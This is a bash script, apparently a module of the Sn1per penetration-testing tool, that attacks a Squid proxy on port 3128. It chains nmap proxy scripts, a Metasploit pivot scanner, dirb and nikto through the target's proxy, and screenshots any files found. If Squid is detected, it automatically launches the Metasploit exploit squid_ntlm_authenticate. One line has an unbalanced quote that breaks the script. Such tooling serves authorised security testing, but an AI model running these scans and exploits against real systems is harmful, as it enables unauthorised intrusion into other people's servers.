#!/bin/bash

VER="2.5"
TARGET="$1"
MODE="$2"
OPT1="$3"
DISABLE_POSTGRESQL="true" # disabling postgresql startup, assuming it's running already
INSTALL_DIR="/usr/share/sniper"
LOOT_DIR="/usr/share/sniper/loot"
PLUGINS_DIR="/usr/share/sniper/plugins"
CMSMAP="/usr/share/sniper/plugins/CMSmap/cmsmap.py"
SAMRDUMP="/usr/share/sniper/bin/samrdump.py"
DNSDICT6="/usr/share/sniper/bin/dnsdict6"
INURLBR="/usr/share/sniper/bin/inurlbr.php"
USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
PASS_FILE="/usr/share/brutex/wordlists/password.lst"
DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
SUPER_MICRO_SCAN="/usr/share/sniper/plugins/SuperMicro-Password-Scanner/supermicro_scan.sh"
DEFAULT_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3128,3306,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049"
DEFAULT_TCP_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3306,3128,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152"
DEFAULT_UDP_PORTS="53,67,68,88,161,162,137,138,139,389,520,2049"
THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
REGEX='^[0-9]+$'

# ENABLE/DISABLE AUTOMATIC BRUTE FORCE
# DEFAULT IS "1" (ENABLED)
AUTOBRUTE="1"

# ENABLE/DISABLE FULL DETAILED NMAP SCAN
# DEFAULT IS "1" (ENABLED)
FULLNMAPSCAN="1"

# ENABLE/DISABLE AUTOMATIC GOOGLE HACKING QUERIES
# DEFAULT IS "1" (ENABLED)
GOOHAK="1"

# ENABLE AUTO UPDATES
# DEFAULT IS "1" (ENABLED)
ENABLE_AUTO_UPDATES="1"

cd $INSTALL_DIR

if [[ ${TARGET:0:1} =~ $REGEX ]];
	then
	SCAN_TYPE="IP"
else
	SCAN_TYPE="DOMAIN"
fi

echo -e "$OKORANGE + -- --=[Port 3128 opened... running tests...$RESET"
nmap -A -p $MODE -Pn -T4 -sV  --script=*proxy* $TARGET -oX "$LOOT_DIR"/nmap/nmap"$MODE"_"$TARGET"_"$(date +'%FT%H%M%S')"_.xml
msfconsole -x "use auxiliary/scanner/http/squid_pivot_scanning; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT $MODE; setg RANGE "$TARGET" - ; exploit; exit;" | tee $LOOT_DIR/notes/msfconsole"$MODE"A.txt
nmap -A --proxy http://$TARGET:$MODE -Pn -T4 -sV 127.0.0.1 -oX $LOOT_DIR/nmap/nmap"$MODE"p-$TARGET.xml
dirb  http://$TARGET /usr/share/wordlists/dirb/big.txt -p http://$TARGET:$MODE -o $LOOT_DIR/notes/dirb"$MODE"_out.txt
#dirb http://$TARGET -X .txt,.php,.html /usr/share/wordlists/dirb/big.txt -p http://$TARGET:3128 -o $LOOT_DIR/notes/dirbExtensions_out.txt

rm $LOOT_DIR/notes/dirb"$MODE"_directories.txt
rm -rf $LOOT_DIR/notes/dirb$MODE"Ext
cat $LOOT_DIR/notes/dirb"$MODE"_out.txt | grep "==>" | cut -f3 -d ' ' > $LOOT_DIR/notes/dirb"$MODE"_directories.txt
DIRB3128DIR="$(cat $LOOT_DIR/notes/dirb"$MODE"_directories.txt)"
if [ -n "$DIRB3128DIR" ]; then
  echo -e "$OKGREEN + -- ----------------------------=[Finding txt, php, and html Files In Directories]=----------- -- +$RESET"
  mkdir $LOOT_DIR/notes/dirb"$MODE"Ext
  for a in `cat $LOOT_DIR/notes/dirb"$MODE"_directories.txt`; do dirb $a -X .txt,.php,.html -o $LOOT_DIR/notes/dirb"$MODE"Ext/$(echo $a | sed -e 's/\//_/g').txt; done;
  cat $LOOT_DIR/notes/dirb"$MODE"Ext/*.txt | grep "+" | cut -d " " -f2 > $LOOT_DIR/notes/dirb"$MODE"Ext/dirb"$MODE"FoundFiles.txt

  DIRB3128SHOTS="$(cat $LOOT_DIR/notes/dirb"$MODE"Ext/dirb"$MODE"FoundFiles.txt)"
  if [ -n "$DIRB3128SHOTS" ]; then
    echo -e "$OKGREEN + -- ----------------------------=[Making Screenshots of txt, php, and html Files In Found Directories]=----------- -- +$RESET"
    for a in `cat $LOOT_DIR/notes/dirb"$MODE"Ext/dirb"$MODE"FoundFiles.txt`; do cutycapt --url=$a --out=$LOOT_DIR/screenshots/$(echo $a | sed -e 's/\//_/g')-port3128.jpg; done;
    find $LOOT_DIR/screenshots/ -size -10k -exec rm -f {} \; 2> /dev/null
  else
    echo -e "$OKORANGE + No Files Found by Dirb +$RESET"
  fi
else
  echo -e "$OKORANGE + No Directories Found by Dirb +$RESET"
fi
nikto -h http://$TARGET -useproxy http://$TARGET:$MODE -output $LOOT_DIR/nmap/nmapNIKTO$MODE_$TARGET_$(date +'%FT%H%M%S')_.xml
nmap $TARGET -p $MODE > squid.txt
grep -Ri "squid" squid.txt > squid1.txt
SQUID="$(cat squid1.txt)"
if [ ! -z "$SQUID" ]; then msfconsole -x "use exploit/linux/proxy/squid_ntlm_authenticate; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$MODE"; setg RANGE "$TARGET" - ; exploit; exit;"
fi
echo -e "$OKGREEN + -- ----------------------------=[Exiting Sniper sh script]=---- -- +$RESET"
exit
